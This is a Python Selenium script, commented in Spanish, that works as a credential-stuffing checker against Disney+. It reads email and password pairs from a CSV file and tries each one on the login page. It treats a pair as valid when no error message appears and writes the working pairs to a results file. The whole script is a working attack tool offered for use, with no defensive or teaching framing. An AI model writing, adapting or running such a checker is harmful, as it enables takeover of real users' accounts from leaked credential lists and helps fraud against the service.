import os.path
import csv
from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, WebDriverException

def iniciar_sesion(usuario, contrasena, credenciales_validas):
    try:
        # Inicializar el navegador Chrome
        driver = webdriver.Chrome()
        driver.maximize_window()

        # Acceder a la página de inicio de sesión de Disney+
        driver.get('https://www.disneyplus.com/es-419/login')

        time.sleep(5)

        # Completar el campo de usuario y hacer clic en 'Siguiente'
        username_field = driver.find_element(By.NAME, 'email')
        username_field.send_keys(usuario)

        submit_next = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
        submit_next.click()
        time.sleep(2)

        # Completar el campo de contraseña y hacer clic en 'Iniciar Sesión'
        password_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/fieldset[2]/span/input')
        password_field.send_keys(contrasena)

        submit_login = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
        submit_login.click()
        time.sleep(3)
        
        # Buscar el mensaje de error en el contenido de la página
        page_content = driver.page_source
        if "Ocurrió un error al iniciar sesión" not in page_content:
            print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
            credenciales_validas.append((usuario, contrasena))
    except NoSuchElementException:
        print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
    except WebDriverException as e:
        print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}: {str(e)}")
    except Exception as e:
        # Imprimir el mensaje de error específico si lo hay
        print(str(e))
    finally:
        # Cerrar el navegador en cualquier caso
        driver.quit()

# Ruta al archivo CSV con las credenciales
csv_file_path = 'csv/data_disneyplus.csv'
credenciales_validas = []

# Verificar si el archivo CSV existe
if os.path.isfile(csv_file_path):
    # Abrir el archivo CSV
    with open(csv_file_path, 'r') as csv_file:
        csv_reader = csv.reader(csv_file)

        # Iterar sobre cada línea del archivo CSV
        for line in csv_reader:
            usuario = line[0]
            contrasena = line[1]

            # Intentar iniciar sesión con las credenciales actuales
            iniciar_sesion(usuario, contrasena, credenciales_validas)

# Guardar las credenciales válidas en un archivo .txt
if credenciales_validas:
    with open('results/credenciales_validas_disneyplus.txt', 'w') as txt_file:
        for credencial in credenciales_validas:
            txt_file.write(f"{credencial[0]},{credencial[1]}\n")

print("Credenciales válidas guardadas en 'results/credenciales_validas_disneyplus.txt'")
